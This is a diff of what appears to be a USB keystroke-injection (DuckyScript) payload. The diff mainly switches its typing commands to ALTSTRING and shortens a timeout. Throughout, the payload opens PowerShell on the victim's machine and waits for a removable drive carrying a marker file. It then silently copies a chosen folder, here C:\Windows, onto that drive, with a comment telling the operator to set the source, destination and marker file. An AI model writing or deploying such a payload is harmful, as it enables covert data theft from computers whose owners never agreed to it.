@@ -22,58 +22,58 @@ REM and change the value of $MaxDuration, $CopyFrom, $CopyTo and $FindMe below a
 DELAY 1000
 GUI r
 DELAY 1000
-STRING powershell
+ALTSTRING powershell
 ENTER
 DELAY 2000
-STRING $MaxDuration = 180
+ALTSTRING $MaxDuration = 20
 ENTER
-ALTCODE $CopyFrom = "C:\Windows"
+ALTSTRING $CopyFrom = "C:\Windows"
 ENTER
-ALTCODE $CopyTo = "copy"
+ALTSTRING $CopyTo = "copy"
 ENTER
-ALTCODE $FindMe = "gfhnubkw.txt"
+ALTSTRING $FindMe = "gfhnubkw.txt"
 ENTER
-STRING $f = $false
+ALTSTRING $f = $false
 ENTER
-STRING $startTime = Get-Date
+ALTSTRING $startTime = Get-Date
 ENTER
-STRING while ((New-TimeSpan -Start $startTime).TotalSeconds -lt $MaxDuration -and -not $f) {
+ALTSTRING while ((New-TimeSpan -Start $startTime).TotalSeconds -lt $MaxDuration -and -not $f) {
 ENTER
-STRING $d = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 }
+ALTSTRING $d = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 }
 ENTER
-STRING foreach ($e in $d) {
+ALTSTRING foreach ($e in $d) {
 ENTER
-STRING $p = Join-Path -Path $e.Name -ChildPath $FindMe
+ALTSTRING $p = Join-Path -Path $e.Name -ChildPath $FindMe
 ENTER
-STRING if (Test-Path $p) {
+ALTSTRING if (Test-Path $p) {
 ENTER
-STRING $f = $true
+ALTSTRING $f = $true
 ENTER
-STRING $partition = Get-Partition | Where-Object { $_.DriveLetter -eq $e.DriveLetter }
+ALTSTRING $partition = Get-Partition | Where-Object { $_.DriveLetter -eq $e.DriveLetter }
 ENTER
-STRING $totalSize = 0
+ALTSTRING $totalSize = 0
 ENTER
-STRING $files = Get-ChildItem $CopyFrom -File -Recurse -ErrorAction SilentlyContinue
+ALTSTRING $files = Get-ChildItem $CopyFrom -File -Recurse -ErrorAction SilentlyContinue
 ENTER
-STRING foreach ($file in $files) {
+ALTSTRING foreach ($file in $files) {
 ENTER
-STRING $totalSize += $file.Length}
+ALTSTRING $totalSize += $file.Length}
 ENTER
-STRING if ($totalSize -lt 1GB) {
+ALTSTRING if ($totalSize -lt 1GB) {
 ENTER
-ALTCODE $totalSizeFormatted = "$([Math]::Round($totalSize / 1MB, 1)) MB"}
+ALTSTRING $totalSizeFormatted = "$([Math]::Round($totalSize / 1MB, 1)) MB"}
 ENTER
-STRING else {
+ALTSTRING else {
 ENTER
-ALTCODE $totalSizeFormatted = "$([Math]::Round($totalSize / 1GB, 1)) GB"}
+ALTSTRING $totalSizeFormatted = "$([Math]::Round($totalSize / 1GB, 1)) GB"}
 ENTER
-ALTCODE Write-Host "Copying... $totalSizeFormatted to $($e.DriveLetter)"
+ALTSTRING Write-Host "Copying... $totalSizeFormatted to $($e.DriveLetter)"
 ENTER
-ALTCODE $Destination = "$($e.Name)\$CopyTo"
+ALTSTRING $Destination = "$($e.Name)\$CopyTo"
 ENTER
-STRING Copy-Item -Path $CopyFrom -Destination $Destination -Recurse -ErrorAction SilentlyContinue
+ALTSTRING Copy-Item -Path $CopyFrom -Destination $Destination -Recurse -ErrorAction SilentlyContinue
 ENTER
-STRING Exit}
+ALTSTRING Exit}
 ENTER
-STRING break}}
+ALTSTRING break}}
 ENTER
